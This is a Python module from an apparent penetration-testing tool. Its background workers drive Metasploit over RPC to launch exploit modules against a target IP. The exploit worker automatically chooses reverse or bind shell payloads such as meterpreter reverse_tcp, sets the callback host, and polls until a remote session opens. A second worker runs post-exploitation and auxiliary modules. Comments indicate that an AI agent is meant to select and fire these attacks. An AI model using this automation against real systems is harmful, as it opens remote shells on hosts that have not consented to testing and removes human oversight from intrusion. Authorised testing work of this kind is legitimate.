"""Background worker threads that drive Metasploit.

run_exploit       loads an exploit module, picks options/payload, fires it, and
                  polls for a new session.
run_post_module   runs an auxiliary or post module through a console and captures
                  its output.

Both update their entry in kroft.state.exploit_jobs (for live UI polling) and
mirror the final state into the ExploitLog table.
"""
import json
import socket
import time
import traceback
from datetime import datetime

from ..database import Session
from ..models import ExploitLog
from ..state import exploit_jobs, msf_lock, msf_sessions
from .msf_client import get_msf
from .msf_console import (console_create, console_destroy, console_read,
                          console_write, strip_msf_banner)
from .msf_modules import compatible_payloads, suggest_modules, validate_module


def run_exploit(job_id, target_ip, module_path, options):
    # msf.modules.use() wants the name without the 'exploit/' type prefix;
    # 'exploit/exploit/...' would make msfrpcd return an error dict that the
    # library crashes on. Normalize so either form works.
    if module_path.lower().startswith('exploit/'):
        module_path = module_path.split('/', 1)[1]
    db = Session()
    log_entry = ExploitLog(target_ip=target_ip, module=module_path,
                           options=json.dumps(options), status='running',
                           started_at=datetime.now().strftime('%H:%M:%S'))
    db.add(log_entry)
    db.commit()
    log_id = log_entry.id
    db.close()

    def _update(status, result='', session_id=''):
        with msf_lock:
            exploit_jobs[job_id].update(status=status, result=result, session_id=session_id)
        db2 = Session()
        entry = db2.query(ExploitLog).filter_by(id=log_id).first()
        if entry:
            entry.status = status; entry.result = result
            entry.session_id = session_id
            entry.finished_at = datetime.now().strftime('%H:%M:%S')
            db2.commit()
        db2.close()

    msf = get_msf()
    if not msf:
        _update('failed', 'Cannot connect to msfrpcd. Is it running?')
        return

    try:
        ok, detail = validate_module(msf, 'exploit', module_path)
        if not ok:
            # Offer real alternatives so the operator/AI can correct course.
            alts = [h['fullname'] for h in suggest_modules(msf, module_path, 'exploit', limit=5)]
            msg = f"Module 'exploit/{module_path}' could not be loaded: {detail}."
            if alts:
                msg += ' Did you mean one of: ' + ', '.join(alts)
            _update('failed', msg)
            return
        exploit = msf.modules.use('exploit', module_path)

        # Extract the payload before setting options (it's not a module option)
        chosen_payload = options.pop('_payload', None)

        # Set all passed options (excluding internal keys)
        for k, v in options.items():
            if v and not k.startswith('_'):
                try:
                    exploit[k] = v
                except Exception:
                    pass

        # Always set RHOSTS/RHOST to target (overrides whatever was passed)
        try:
            exploit['RHOSTS'] = target_ip
        except Exception:
            pass
        try:
            exploit['RHOST'] = target_ip
        except Exception:
            pass

        # Auto-set LHOST to our own IP if needed and not already set
        if 'LHOST' not in options or not options.get('LHOST'):
            try:
                lhost = socket.gethostbyname(socket.gethostname())
                # Prefer the routable IP toward the target
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((target_ip, 80))
                lhost = s.getsockname()[0]
                s.close()
                exploit['LHOST'] = lhost
            except Exception:
                pass

        # Pick the best payload if not specified
        if not chosen_payload:
            try:
                available = compatible_payloads(msf, module_path, exploit.target)
                # Check if module is a bind-shell type (backdoor, bind_tcp etc.)
                # by seeing if it has no reverse payloads or only bind/interact payloads
                has_reverse = any('reverse' in p for p in available)
                has_bind    = any('bind' in p or 'interact' in p for p in available)

                if has_bind and not has_reverse:
                    # Pure bind-shell module (e.g. vsftpd_234_backdoor): must use interact/bind
                    bind_prefs = ['cmd/unix/interact',
                                  'generic/shell_bind_tcp',
                                  'linux/x86/shell_bind_tcp',
                                  'linux/x86/meterpreter/bind_tcp']
                    chosen_payload = next((p for p in bind_prefs if p in available), available[0])
                else:
                    # Standard reverse shell preference order
                    reverse_prefs = ['linux/x86/meterpreter/reverse_tcp',
                                     'linux/x64/meterpreter/reverse_tcp',
                                     'windows/meterpreter/reverse_tcp',
                                     'windows/x64/meterpreter/reverse_tcp',
                                     'cmd/unix/reverse',
                                     'generic/shell_reverse_tcp']
                    chosen_payload = next((p for p in reverse_prefs if p in available),
                                         available[0] if available else 'generic/shell_reverse_tcp')
            except Exception:
                chosen_payload = 'generic/shell_reverse_tcp'

        with msf_lock:
            exploit_jobs[job_id]['status'] = 'running'

        # Snapshot sessions before execute, and guard against a bool response
        try:
            sessions_raw = msf.sessions.list
            known = set(sessions_raw.keys()) if isinstance(sessions_raw, dict) else set()
        except Exception:
            known = set()

        # Execute via the low-level module manager instead of exploit.execute().
        # pymetasploit3's ExploitModule.execute() validates the payload by reading
        # self.payloads -> targetpayloads(), which does rpc.call(...)['payloads'].
        # On many msfrpcd builds that RPC returns a bare bool, so the subscript
        # raises "'bool' object is not subscriptable" and the exploit looks failed
        # even when it would have worked. Building runopts ourselves avoids it.
        runopts = dict(exploit.runoptions)
        runopts['TARGET'] = exploit.target
        if chosen_payload:
            runopts['PAYLOAD'] = chosen_payload
        else:
            runopts['DisablePayloadHandler'] = True
        result = msf.modules.execute('exploit', module_path, **runopts)

        # pymetasploit3 can return True/False instead of a dict when the RPC
        # call succeeds but carries no payload, so guard every access.
        if not isinstance(result, dict):
            _update('failed', f'Unexpected execute() response: {result!r}')
            return

        if result.get('job_id') is not None:
            msf_job_id = result['job_id']
            _update('launched', f"MSF job {msf_job_id} started")
            with msf_lock:
                exploit_jobs[job_id]['msf_job_id'] = msf_job_id

            # Poll for new sessions for up to 30 seconds.
            # Don't break early when the MSF job disappears from jobs.list: for
            # bind-shell modules (vsftpd_234_backdoor etc.) the handler job ends
            # almost immediately but the session registration happens a moment later.
            # Keep polling the full window unless a session actually appears.
            job_finished_at = None
            deadline = time.time() + 30
            while time.time() < deadline:
                time.sleep(1.5)
                try:
                    sessions_raw = msf.sessions.list
                    if not isinstance(sessions_raw, dict):
                        continue
                    current = set(sessions_raw.keys())
                    new_sids = current - known
                    if new_sids:
                        sid = list(new_sids)[0]
                        info = sessions_raw[sid]
                        with msf_lock:
                            msf_sessions[str(sid)] = {
                                'id': str(sid),
                                'type': info.get('type', 'shell'),
                                'target': info.get('target_host', target_ip),
                                'tunnel': info.get('tunnel_local', ''),
                                'info': info.get('info', ''),
                                'opened_at': datetime.now().strftime('%H:%M:%S'),
                                'module': module_path,
                                'log': []
                            }
                        _update('succeeded', f'Session {sid} opened on {target_ip}', str(sid))
                        return
                except Exception:
                    pass

                # Track when the MSF job finished, but keep polling for up to 5s after
                try:
                    jobs_raw = msf.jobs.list
                    if isinstance(jobs_raw, dict) and job_finished_at is None and msf_job_id not in jobs_raw:
                        job_finished_at = time.time()
                    if job_finished_at and (time.time() - job_finished_at) > 5:
                        break  # 5s grace after job exits, still no session
                except Exception:
                    pass

            _update('timed_out', 'No session within timeout')
        else:
            # MSF returns {'error': True, 'error_class': ..., 'error_message': ...} on failure
            if isinstance(result, dict) and result.get('error'):
                msg = result.get('error_message') or result.get('error_class') or str(result)
            elif isinstance(result, dict) and 'job_id' in result:
                # Module executed but MSF started no handler job, so no session was
                # created. Usually means the target wasn't exploitable (patched,
                # not vulnerable, or wrong target settings).
                msg = ('Module ran but opened no session. Target may be patched, '
                       'not vulnerable, or needs different options.')
            else:
                msg = str(result)
            _update('failed', msg)
    except Exception as e:
        tb = traceback.format_exc()
        _update('failed', f'{type(e).__name__}: {e}')
        print(f'[msf error] {job_id}: {e}\n{tb}', flush=True)


def run_post_module(job_id, module_path, options, mtype):
    """Worker: run a post or auxiliary module via MSF console and capture output."""
    db  = Session()
    log = ExploitLog(
        target_ip=options.get('SESSION', options.get('RHOSTS', '?')),
        module=module_path, options=json.dumps(options),
        status='running', started_at=datetime.now().strftime('%H:%M:%S')
    )
    db.add(log); db.commit(); log_id = log.id; db.close()

    def _update(status, result=''):
        with msf_lock:
            exploit_jobs[job_id].update(status=status, result=result)
        db2 = Session()
        entry = db2.query(ExploitLog).filter_by(id=log_id).first()
        if entry:
            entry.status = status; entry.result = result
            entry.finished_at = datetime.now().strftime('%H:%M:%S')
            db2.commit()
        db2.close()

    msf = get_msf()
    if not msf:
        _update('failed', 'MSF not connected'); return

    try:
        # Fresh console via the safe helpers (see console_create for why we don't
        # use msf.consoles.console()).
        cid = console_create(msf)

        # Build the command sequence
        cmds = [f'use {module_path}']
        for k, v in options.items():
            if v:
                cmds.append(f'set {k} {v}')
        # For auxiliary: run; for post: run (same, SESSION must be set)
        cmds.append('run -j')

        combined_output = ''
        for cmd in cmds:
            console_write(msf, cid, cmd)
            time.sleep(0.3)

        # Poll for output up to 90 seconds
        deadline = time.time() + 90
        idle_streak = 0
        while time.time() < deadline:
            time.sleep(1.2)
            chunk = console_read(msf, cid).get('data', '')
            if chunk:
                combined_output += chunk
                idle_streak = 0
                # Update live result
                with msf_lock:
                    exploit_jobs[job_id]['result'] = combined_output
            else:
                idle_streak += 1
                # 8 consecutive empty reads (~10s) = done
                if idle_streak >= 8 and combined_output:
                    break

        console_destroy(msf, cid)

        # Store full output (banner stripped so the AI gets only the real results)
        combined_output = strip_msf_banner(combined_output)
        with msf_lock:
            exploit_jobs[job_id]['output'] = combined_output

        _update('succeeded' if combined_output else 'completed', combined_output[:2000])
    except Exception as e:
        tb = traceback.format_exc()
        _update('failed', f'{type(e).__name__}: {e}')
        print(f'[post error] {job_id}: {e}\n{tb}', flush=True)
